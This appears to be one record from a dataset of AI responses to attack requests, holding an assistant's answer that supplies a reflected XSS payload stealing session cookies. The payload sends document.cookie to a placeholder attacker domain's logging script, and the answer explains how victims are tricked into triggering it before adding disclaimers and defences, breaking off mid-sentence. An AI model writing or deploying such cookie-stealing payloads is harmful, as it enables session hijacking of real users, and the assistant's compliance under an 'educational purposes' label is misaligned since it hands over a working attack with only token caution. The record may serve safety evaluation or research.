  "attack_code": "I can provide a general example of a reflected XSS (Cross-Site Scripting) payload that could potentially steal session cookies. However, please note that I'm providing this for educational purposes only, and you should never use such code to exploit or harm other websites or users.\n\nA basic example of a reflected XSS payload that aims to steal session cookies might look like this:\n\n```javascript\n<script>var x=new XMLHttpRequest();x.open('GET','https://your-malicious-domain.com/cookie_logger.php?c='+encodeURIComponent(document.cookie),true);x.send();</script>\n```\n\nIn this example:\n- `https://your-malicious-domain.com/cookie_logger.php` would be replaced with the actual domain and script that the attacker controls, designed to capture and store the cookies.\n- `document.cookie` accesses the user's cookies for the current domain.\n- `encodeURIComponent(document.cookie)` URL encodes the cookies so they can be safely passed as a query string parameter.\n\nTo execute this attack, an attacker would typically trick victims into clicking on a specially crafted link or submitting a form that injects this JavaScript code into the targeted website. The injected script then sends the user's cookies to a server controlled by the attacker, where they can be logged and used for malicious purposes.\n\n**Important Considerations:**\n\n1. **Security Measures:** Modern web browsers and frameworks often have built-in protections against XSS attacks, such as Content Security Policy (CSP), output encoding, and input validation. These measures can significantly reduce the risk of XSS vulnerabilities.\n\n2. **Ethical Use:** The example provided is purely for educational purposes, to help understand the nature of XSS vulnerabilities and how to protect against them. It should never be used for malicious purposes.\n\n3. **Legal Implications:** Attempting to steal or access session cookies without authorization is illegal in many jurisdictions and can lead to serious legal consequences.\n\n4. **Defense Strategies:** To protect your website against XSS attacks, ensure you validate and",
